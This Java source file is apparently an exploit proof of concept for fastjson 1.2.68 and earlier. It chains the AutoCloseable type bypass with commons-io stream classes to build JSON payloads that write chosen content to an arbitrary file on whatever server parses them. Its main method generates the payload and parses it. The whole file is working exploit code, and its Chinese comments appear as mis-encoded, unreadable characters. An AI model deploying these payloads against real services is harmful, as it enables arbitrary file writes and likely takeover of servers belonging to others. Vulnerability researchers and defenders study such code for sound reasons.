package test;

import com.alibaba.fastjson.JSON;
import org.apache.commons.io.FileUtils;
import java.io.File;
import java.io.IOException;

/**
 * fastjson 1.2.68 autocloseable commons-io<=2.4 poc ���ɹ�����
 *
 * @author su18
 */
public class Fastjson7_io_write_3 {
	//<=1.2.68 and commons-io
	public static final String AUTOCLOSEABLE_TAG = "\"@type\":\"java.lang.AutoCloseable\",";
	/**
	 * �� payload �����һ���ƹ�ָ������
	 *
	 * @param payload payload
	 * @return ���ؽ��
	 */
	public static String bypassSpecializedClass(String payload) {
		return "{\"su18\":" + payload + "}";
	}
	/**
	 * ʹ�� Currency ��������� "currency" �� value �� toString ������ʹ�� JSONObject �������� toJSONString
	 *
	 * @param payload payload
	 * @return ���ؽ��
	 */
	public static String useCurrencyTriggerAllGetter(String payload, boolean ref) {
		return String.format("{\"@type\":\"java.util.Currency\",\"val\":{\"currency\":%s%s}}%s",
				(ref ? "" : "{\"su19\":"), payload, (ref ? "" : "}"));
	}


	/**
	 * ���� CharSequenceInputStream �����л��ַ���
	 *
	 * @param content д������
	 * @param ref     �Ƿ�ʹ�����ö���
	 * @return ���ؽ��
	 */
	public static String generateCharSequenceInputStream(String content, boolean ref) {
		int mod = 8192 - content.length() % 8192;

		StringBuilder contentBuilder = new StringBuilder(content);
		for (int i = 0; i < mod+1; i++) {
			contentBuilder.append(" ");
		}

		return String.format("{%s\"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\"," +
						"\"charset\":\"UTF-8\",\"bufferSize\":4,\"s\":{\"@type\":\"java.lang.String\"\"%s\"}",
				ref ? AUTOCLOSEABLE_TAG : "", contentBuilder);
	}


	/**
	 * ���� FileWriterWithEncoding �����л��ַ���
	 *
	 * @param filePath Ҫд����ļ�λ��
	 * @param ref      �Ƿ�ʹ�����ö���
	 * @return ���ؽ��
	 */
	public static String generateFileWriterWithEncoding(String filePath, boolean ref) {
		return String.format("{%s\"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\"," +
				"\"file\":\"%s\",\"encoding\":\"UTF-8\"}", ref ? AUTOCLOSEABLE_TAG : "", filePath);
	}

	/**
	 * ���� WriterOutputStream �����л��ַ���
	 *
	 * @param writer writer �������л��ַ���
	 * @param ref    �Ƿ�ʹ�����ö���
	 * @return ���ؽ��
	 */
	public static String generateWriterOutputStream(String writer, boolean ref) {
		return String.format("{%s\"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\"writeImmediately\":true," +
						"\"bufferSize\":4,\"charsetName\":\"UTF-8\",\"writer\":%s}",
				ref ? AUTOCLOSEABLE_TAG : "", writer);
	}


	/**
	 * ���� TeeInputStream �����л��ַ���
	 *
	 * @param inputStream  inputStream ��
	 * @param outputStream outputStream ��
	 * @param ref          �Ƿ�ʹ�����ö���
	 * @return ���ؽ��
	 */
	public static String generateTeeInputStream(String inputStream, String outputStream, boolean ref) {
		return String.format("{%s\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":%s," +
				"\"closeBranch\":true,\"branch\":%s}", ref ? AUTOCLOSEABLE_TAG : "", inputStream, outputStream);
	}


	/**
	 * ���� BOMInputStream �����л��ַ���
	 *
	 * @param inputStream inputStream ��
	 * @param size        ��ȡ byte ��С
	 * @return ���ؽ��
	 */
	public static String generateBOMInputStream(String inputStream, int size) {

		int nums = size / 8192;
		int mod  = size % 8192;

		if (mod != 0) {
			nums = nums + 1;
		}

		StringBuilder bytes = new StringBuilder("0");
		for (int i = 0; i < nums * 8192; i++) {
			bytes.append(",0");
		}
		return String.format("{%s\"@type\":\"org.apache.commons.io.input.BOMInputStream\",\"delegate\":%s," +
						"\"boms\":[{\"charsetName\":\"UTF-8\",\"bytes\":[%s]}]}",
				AUTOCLOSEABLE_TAG, inputStream, bytes);
	}


	/**
	 * ��ȡ�ļ������ַ���
	 *
	 * @param file �ļ�·��
	 * @return �����ַ���
	 */
	public static String readFile(File file) {
		String result = "";

		try {
			result = FileUtils.readFileToString(file);
		} catch (IOException e) {
			e.printStackTrace();
		}

		return result;
	}


	/**
	 * ������ͨ payload
	 *
	 * @param payloadFile    д���ļ����ش洢λ��
	 * @param targetFilePath д��Ŀ���ļ�λ��
	 * @return ���� payload
	 */
	public static String generatePayload(String payloadFile, String targetFilePath) {
		File   file        = new File(payloadFile);
		String fileContent = readFile(file);
		if (!"".equals(fileContent)) {
			return bypassSpecializedClass(
					useCurrencyTriggerAllGetter(
							generateBOMInputStream(
									generateTeeInputStream(generateCharSequenceInputStream(fileContent, false),
											generateWriterOutputStream(
													generateFileWriterWithEncoding(targetFilePath, false),
													false),
											false),
									(int) file.length()),
							false));
		}

		return "";
	}

	/**
	 * ���������� payload
	 *
	 * @param payloadFile    д���ļ����ش洢λ��
	 * @param targetFilePath д��Ŀ���ļ�λ��
	 * @return ���� payload
	 */
	public static String generateRefPayload(String payloadFile, String targetFilePath) {
		File   file        = new File(payloadFile);
		String fileContent = readFile(file);
		if (!"".equals(fileContent)) {
			return bypassSpecializedClass(
					useCurrencyTriggerAllGetter(
							"{\"writer\":" + generateFileWriterWithEncoding(targetFilePath, true) +
									",\"outputStream\":" + generateWriterOutputStream("{\"$ref\":\"$.currency.writer\"}", true) +
									",\"charInputStream\":" + generateCharSequenceInputStream(fileContent, true) +
									",\"teeInputStream\":" + generateTeeInputStream("{\"$ref\":\"$.currency.charInputStream\"}", "{\"$ref\":\"$.currency.outputStream\"}", true) +
									",\"inputStream\":" + generateBOMInputStream("{\"$ref\":\"$.currency.teeInputStream\"}", (int) file.length()) + "}"
							, true
					)
			);
		}

		return "";

	}


	public static void main(String[] args) {
		String file   = "1.txt";
		String target = "2.txt";

		// �������� payload ����
		String payload = generatePayload(file, target);

		// �������� payload ����
		String payloadWithRef = generateRefPayload(file, target);
		System.out.println(payloadWithRef);
//		�������ֵ��÷�ʽ���ɼ��ݣ����������л�
//		JSON.parse(payloadWithRef);
		JSON.parseObject(payloadWithRef);
//		JSON.parseObject(payloadWithRef,POC.class);
	}

}
